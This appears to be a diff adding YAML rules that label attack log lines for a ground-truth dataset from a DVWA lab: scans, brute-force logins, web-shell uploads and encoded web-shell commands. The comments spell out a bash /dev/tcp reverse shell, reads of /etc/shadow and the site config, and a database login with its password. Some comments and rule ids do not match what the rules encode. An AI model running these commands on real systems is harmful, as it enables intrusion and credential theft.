@@ -1,0 +1,348 @@
+# Labelling Rules untuk Ground Truth Dataset
+# Format:
+#   - filter: list of patterns (AND condition - semua pattern harus match)
+#   - Pattern matching bersifat case-insensitive
+
+###
+# ATTACKER A
+
+# Dirb Scan
+- id: dirb_scan
+  ground_truth_label: dirb_scan
+  sensitivity: moderate
+  filter:
+    - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+    - "192.168.115.21"
+
+# brute force login
+- id: brute_force_login
+  ground_truth_label: brute_force_login
+  sensitivity: moderate
+  filter:
+    - /dvwa/login.php
+    - "python-requests/2.32.5"
+    - "192.168.115.21"
+
+# Upload Shell 1
+- id: upload_rce_shell
+  ground_truth_label: upload_rce_shell
+  sensitivity: moderate
+  filter:
+    - login.php
+    - Mozilla/5.0
+    - "192.168.115.21"
+# Upload Shell 2
+- id: upload_rce_shell
+  ground_truth_label: upload_rce_shell
+  sensitivity: moderate
+  filter:
+    - vulnerabilities/upload/
+    - Mozilla/5.0
+    - "192.168.115.21"
+
+# uname via Webshell
+# uname
+- id: check_uname
+  ground_truth_label: check_uname
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJ1bmFtZSJd"
+    - "192.168.115.21"
+
+# ip a via Webshell
+- id: check_ip_config
+  ground_truth_label: check_ip_config
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJpcCIsICJhIl0%3D"
+    - "192.168.115.21"
+
+# date via Webshell
+# date
+- id: check_date
+  ground_truth_label: check_date
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJkYXRlIl0%3D"
+    - "192.168.115.21"
+
+# lsb_release -a via Webshell
+# lsb_release -a
+- id: check_lsb_release
+  ground_truth_label: check_lsb_release
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJsc2JfcmVsZWFzZSIsICItYSJd"
+    - "192.168.115.21"
+
+# last via Webshell
+# last
+- id: check_last
+  ground_truth_label: check_last
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJsYXN0Il0%3D"
+    - "192.168.115.21"
+
+# pwd via Webshell
+# pwd
+- id: check_pwd
+  ground_truth_label: check_pwd
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJwd2QiXQ%3D%3D"
+    - "192.168.115.21"
+
+# ls -lh /home via Webshell
+# ls -lh /home
+- id: list_web_dir
+  ground_truth_label: list_web_dir
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJscyIsICItbGgiLCAiL2hvbWUiXQ%3D%3D"
+    - "192.168.115.21"
+
+# cat /etc/group via Webshell
+# cat /etc/group
+- id: check_group
+  ground_truth_label: check_group
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJjYXQiLCAiL2V0Yy9ncm91cCJd"
+    - "192.168.115.21"
+
+# check_web_config via Webshell
+# cat /var/www/html/dvwa/config/config.inc.php
+- id: check_web_config
+  ground_truth_label: check_web_config
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJjYXQiLCAiL3Zhci93d3cvaHRtbC9kdndhL2NvbmZpZy9jb25maWcuaW5jLnBocCJd"
+    - "192.168.115.21"
+
+# database via Webshell
+# "mysql -u dvwa -pp@ssw0rd -e \"SHOW TABLES;\" dvwa"
+- id: database_query
+  ground_truth_label: database_query
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJteXNxbCIsICItdSIsICJkdndhIiwgIi1wcEBzc3cwcmQiLCAiLWUiLCAiXCJTSE9XIFRBQkxFUztcIiIsICJkdndhIl0%3D"
+    - "192.168.115.21"
+
+# bash via Webshell
+# "bash", "-c", "'0<&196;exec 196<>/dev/tcp/192.168.115.22/4321; sh <&196 >&196 2>&196'", "&"
+- id: reverse_shell
+  ground_truth_label: reverse_shell
+  sensitivity: moderate
+  filter:
+    - "file.php?q=WyJiYXNoIiwgIi1jIiwgIicwPCYxOTY7ZXhlYyAxOTY8Pi9kZXYvdGNwLzE5Mi4xNjguMTE1LjIxLzQzMjE7IHNoIDwmMTk2ID4mMTk2IDI%2BJjE5NiciLCAiJiJd"
+    - "192.168.115.21"
+
+###
+# ATTACKER B
+
+# Dirb Scan
+- id: dirb_scan
+  ground_truth_label: dirb_scan
+  sensitivity: moderate
+  filter:
+    - "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+    - "192.168.115.22"
+
+# wpscan
+- id: wpscan
+  ground_truth_label: wpscan
+  sensitivity: moderate
+  filter:
+    - "wpscan"
+    - "192.168.115.22"
+
+# Upload Shell
+- id: upload_rce_shell
+  ground_truth_label: upload_rce_shell
+  sensitivity: moderate
+  filter:
+    - vulnerabilities/upload/
+    - python-requests
+    - "192.168.115.22"
+
+# id via Webshell
+- id: check_id
+  ground_truth_label: check_id
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJpZCJd"
+    - "192.168.115.22"
+
+# netstat -nat via webshell
+- id: check_netstat
+  ground_truth_label: check_netstat
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJuZXRzdGF0IiwgIi1uYXQiXQ%3D%3D"
+    - "192.168.115.22"
+
+# cat /proc/cpuinfo via webshell
+- id: check_cpuinfo
+  ground_truth_label: check_cpuinfo
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJjYXQiLCAiL3Byb2MvY3B1aW5mbyJd"
+    - "192.168.115.22"
+
+# uptime via webshell
+- id: check_uptime
+  ground_truth_label: check_uptime
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJ1cHRpbWUiXQ%3D%3D"
+    - "192.168.115.22"
+
+# last via webshell
+- id: check_last
+  ground_truth_label: check_last
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJsYXN0Il0%3D"
+    - "192.168.115.22"
+
+# pwd via webshell
+- id: check_pwd
+  ground_truth_label: check_pwd
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJwd2QiXQ%3D%3D"
+    - "192.168.115.22"
+
+# df -h via webshell
+- id: check_df
+  ground_truth_label: check_df
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJkZiIsICItaCJd"
+    - "192.168.115.22"
+
+# lsb_release -a via webshell
+- id: check_lsb_release
+  ground_truth_label: check_lsb_release
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJsc2JfcmVsZWFzZSIsICItYSJd"
+    - "192.168.115.22"
+
+# ls -l /var/www/html/dvwa/config/ via webshell
+- id: check_ls
+  ground_truth_label: check_ls
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJscyIsICItbCIsICIvdmFyL3d3dy9odG1sL2R2d2EvY29uZmlnLyJd"
+    - "192.168.115.22"
+
+# cat /var/www/html/dvwa/config/config.inc.php via webshell
+- id: check_web_config
+  ground_truth_label: check_web_config
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJjYXQiLCAiL3Zhci93d3cvaHRtbC9kdndhL2NvbmZpZy9jb25maWcuaW5jLnBocCJd"
+    - "192.168.115.22"
+
+# mysql -u dvwa -pp@ssw0rd -e \"SHOW DATABASES;\" via webshell
+- id: database_query
+  ground_truth_label: database_query
+  sensitivity: moderate
+  filter:
+    - "exp.php?q=WyJteXNxbCIsICItdSIsICJkdndhIiwgIi1wcEBzc3cwcmQiLCAiLWUiLCAiXCJTSE9XIERBVEFCQVNFUztcIiJd"
+    - "192.168.115.22"
+
+# brute force ssh login
+- id: brute_force_ssh_login_failed
+  ground_truth_label: brute_force_ssh_login_failed
+  sensitivity: moderate
+  filter:
+    - "Failed password"
+    - "192.168.115.22"
+# brute force ssh login
+- id: brute_force_ssh_login_failed
+  ground_truth_label: brute_force_ssh_login_failed
+  sensitivity: moderate
+  filter:
+    - "authentication failure"
+    - "192.168.115.22"
+
+# brute force ssh login
+- id: brute_force_ssh_login_success
+  ground_truth_label: brute_force_ssh_login_success
+  sensitivity: moderate
+  filter:
+    - "Accepted password"
+    - "192.168.115.22"
+
+###
+# privilege escalation
+
+# User Login Activity in Server
+- id: login_user
+  ground_truth_label: login_user
+  sensitivity: moderate
+  filter:
+    - systemd-logind
+    - new session
+    - dvwa
+
+# Sudo Read Shadow from Web Directory
+- id: read_shadow
+  ground_truth_label: read_shadow
+  sensitivity: moderate
+  filter:
+    - "[sudo]"
+    - var/www
+    - bin/cat
+    - /etc/shadow
+
+# Sudo List Root from Web Directory
+- id: list_root
+  ground_truth_label: list_root
+  sensitivity: moderate
+  filter:
+    - "[sudo]"
+    - var/www
+    - bin/ls
+    - /root
+
+# Sudo crontab from Web Directory
+- id: sudo_crontab
+  ground_truth_label: sudo_crontab
+  sensitivity: moderate
+  filter:
+    - "[sudo]"
+    - var/www
+    - bin/crontab
+
+# Sudo Read passwd from Web Directory
+- id: read_passwd
+  ground_truth_label: read_passwd
+  sensitivity: moderate
+  filter:
+    - "[sudo]"
+    - var/www
+    - bin/cat
+    - /etc/passwd
+
+# Sudo Read iptables from Web Directory
+- id: read_iptables
+  ground_truth_label: read_iptables
+  sensitivity: moderate
+  filter:
+    - "[sudo]"
+    - var/www
+    - iptables
+
+# Sudo Read Shadow from Web Directory
+- id: read_shadow
+  ground_truth_label: read_shadow
+  sensitivity: moderate
+  filter:
+    - "[sudo]"
+    - var/www
+    - bin/cat
+    - ".bash_history"
